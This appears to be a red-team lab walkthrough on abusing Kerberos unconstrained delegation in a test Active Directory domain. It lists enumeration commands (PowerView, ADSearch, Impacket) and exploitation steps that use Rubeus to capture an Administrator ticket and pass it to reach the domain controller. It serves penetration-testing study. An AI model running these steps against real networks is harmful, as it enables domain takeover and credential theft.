
# Scenario

> The lab always requires some domain user credential material or Administrative priviledges on a particular machine. For a particular vulnerability we simply consider the assumptions for individual attacks.

---

# Kerberos Unconstrained Delegation(KUD) - Computer 

Assumption, we have compromised `domuser@red.local` who is a local administrator on the `WEBSRV` machine and the `WEBSRV` machine is `TrustedForDelegation`. 

## Enumeration

1. ADModule

```powershell
Import-Module .\Microsoft.ActiveDirectory.Management.dll

Get-ADComputer -Filter {TrustedForDelegation -eq $true -and primarygroupid -eq 515} -Properties trustedfordelegation,serviceprincipalname,description
```

2. ADSearch

```bash
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname
```

3. PowerView

```powershell
. .\PowerView.ps1

Get-NetComputer -Unconstrained | select dnshostname,samaccountname
```

4. Impacket

```bash
findDelegation.py red.local/domuser:'P@ssw0rd1!' -target-domain red.local
```

## Exploitation


1. Try listing the C$ on the DC to confirm we don't have administrator privileges on the DC

```bash
dir \\dc01\c$
```

2. Run `Rubeus.exe` to view the tickets.

```bash
.\Rubeus.exe triage

klist
```

3. On websrv run the following to capture TGTs

```bash
.\Rubeus.exe monitor /monitorinterval:10 /filteruser:Administrator /nowrap
```

4. Logon to the DC and list the C$ on webserver.

```bash
whoami

hostname

dir \\websrv.red.local\c$
```

5. Use Rubues.exe ptt module

```bash
.\Rubeus.exe ptt /ticket:<base64-ticket>
klist
```

6. Try listing the C$ on the DC now to confirm that we have Administrator Credential material.

```
dir \\dc01\c$
```